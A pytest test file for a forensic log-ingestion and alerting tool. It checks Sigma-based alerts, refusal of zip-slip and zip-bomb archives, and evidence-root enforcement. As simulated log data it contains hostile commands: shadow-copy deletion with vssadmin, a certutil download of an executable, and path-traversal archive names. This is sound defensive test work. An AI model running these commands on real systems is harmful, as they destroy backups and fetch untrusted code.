"""One-call ingestion of files, folders and archives."""
from __future__ import annotations

import io
import json
import zipfile
from pathlib import Path

import pytest

from glaive.ingestion.pipeline import ArchiveError, ingest_path, safe_extract
from glaive.mcp_server import tools
from glaive.mcp_server.session import GlaiveSession


def _jsonl(path: Path, events: list[dict]) -> Path:
    path.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
    return path


def _proc_event(cmd: str, pid: int = 10, rid: int = 1) -> dict:
    return {"event_id": 1, "time_created": "2026-09-14T09:00:00Z", "computer": "WS",
            "channel": "Microsoft-Windows-Sysmon/Operational", "_record_id": rid,
            "raw_data": {"ProcessId": pid, "Image": "C:\\Windows\\System32\\cmd.exe",
                         "CommandLine": cmd, "ParentProcessId": 4, "ParentImage": "C:\\p.exe",
                         "UtcTime": "2026-09-14 09:00:00.000"}}


def test_demo_folder_end_to_end(demo_session: GlaiveSession) -> None:
    s = demo_session
    counts = s.graph.type_counts()
    assert counts["Alert"] >= 15 and counts["Process"] > 100
    titles = {a.title for a in s.graph.find_nodes("Alert")}
    for expected in ("Volume Shadow Copies Deleted", "Brute Force Followed by Successful Logon",
                     "Prompt-Injection Text Planted in Evidence",
                     "Microsoft Defender Real-Time Protection Disabled"):
        assert expected in titles
    # every alert traces to a stored evidence file
    for a in s.graph.find_nodes("Alert"):
        assert s.store.has(a.evidence_hash)
        assert "record" in a.derivation


def test_duplicate_logs_do_not_duplicate_alerts(demo_session: GlaiveSession) -> None:
    shadow = [a for a in demo_session.graph.find_nodes("Alert")
              if a.title == "Volume Shadow Copies Deleted"]
    assert len(shadow) == 1
    assert "CorroboratedBy" in shadow[0].matched_fields


def test_alerts_link_to_their_process(demo_session: GlaiveSession) -> None:
    a = next(n for n in demo_session.graph.find_nodes("Alert")
             if n.title == "Credential Dumping Tool Command Line")
    roles = {e.role: e.target_key for e in demo_session.graph.outgoing_edges(a.canonical_key())}
    assert roles["process"][0] == "Process"
    assert demo_session.graph.get_node(roles["process"]).name == "rundll32.exe"
    assert roles["host"] == ("Host", "WS-FIN-07.corp.example")


def test_zip_with_mixed_files(tmp_path: Path) -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("logs/sysmon.jsonl", json.dumps(_proc_event("vssadmin delete shadows /all")))
        z.writestr("notes.txt", "analyst notes")
    zpath = tmp_path / "triage.zip"
    zpath.write_bytes(buf.getvalue())
    s = GlaiveSession(analysis_dir=tmp_path / "case")
    summary = ingest_path(s, zpath)
    statuses = {Path(f.path).name: f.status for f in summary.files}
    assert statuses == {"sysmon.jsonl": "ingested", "notes.txt": "skipped"}
    assert summary.alerts_by_level.get("critical") == 1
    assert len(s.store) == 3  # the zip itself + both members, all hashed for custody


@pytest.mark.parametrize("name", ["../evil.txt", "/abs/evil.txt", "C:/evil.txt", "a/../../e.txt"])
def test_zip_slip_is_refused(tmp_path: Path, name: str) -> None:
    zpath = tmp_path / "bad.zip"
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr(name, "x")
    with pytest.raises(ArchiveError):
        safe_extract(zpath, tmp_path / "out")
    assert not (tmp_path / "evil.txt").exists()


def test_zip_bomb_is_refused(tmp_path: Path) -> None:
    zpath = tmp_path / "bomb.zip"
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("zeros.bin", b"\0" * (20 * 1024 * 1024))
    with pytest.raises(ArchiveError, match="zip bomb"):
        safe_extract(zpath, tmp_path / "out")


def test_evidence_root_is_enforced(tmp_path: Path) -> None:
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    outside = _jsonl(tmp_path / "x.jsonl", [_proc_event("dir")])
    s = GlaiveSession(analysis_dir=tmp_path / "case", evidence_root=allowed)
    with pytest.raises(PermissionError):
        ingest_path(s, outside)


def test_ingest_tool_auto_mode(tmp_path: Path) -> None:
    d = tmp_path / "ev"
    d.mkdir()
    _jsonl(d / "a.jsonl", [_proc_event("certutil -urlcache -f http://x/a.exe a.exe")])
    s = GlaiveSession(analysis_dir=tmp_path / "case")
    r = tools.do_ingest_artifact(s, str(d))  # source_type defaults to auto
    assert r["status"] == "ok" and r["events_total"] == 1
    assert r["files"][0]["name"] == "a.jsonl"


def test_extra_sigma_folder(tmp_path: Path) -> None:
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "custom.yml").write_text(
        "title: Custom Dir Listing\nid: c1\nlogsource:\n  category: process_creation\n"
        "  product: windows\ndetection:\n  s:\n    CommandLine|contains: 'dir'\n"
        "  condition: s\nlevel: low\n", encoding="utf-8")
    f = _jsonl(tmp_path / "a.jsonl", [_proc_event("cmd /c dir")])
    s = GlaiveSession(analysis_dir=tmp_path / "case")
    summary = ingest_path(s, f, sigma_paths=[rules])
    assert any(a.title == "Custom Dir Listing" for a in s.graph.find_nodes("Alert"))
    assert summary.rules_loaded >= 26


def test_case_folder_inside_evidence_folder_is_skipped(tmp_path: Path) -> None:
    _jsonl(tmp_path / "a.jsonl", [_proc_event("dir")])
    s = GlaiveSession(analysis_dir=tmp_path / "cases" / "c1")
    ingest_path(s, tmp_path)
    s.save()
    again = ingest_path(s, tmp_path)  # second run must not ingest case.glaive or the store
    assert [Path(f.path).name for f in again.files] == ["a.jsonl"]


def test_damaged_evtx_is_skipped_not_crashed(tmp_path: Path) -> None:
    """Ingesting a truncated EVTX gives a structured 'skipped' result."""
    f = tmp_path / "Security.evtx"
    f.write_bytes(b"ElfFile\x00" + b"\x00" * 1024)
    r = tools.do_ingest_artifact(GlaiveSession(analysis_dir=tmp_path / "a"), str(f), "auto")
    assert r["status"] == "ok" and r["files"][0]["status"] == "skipped"
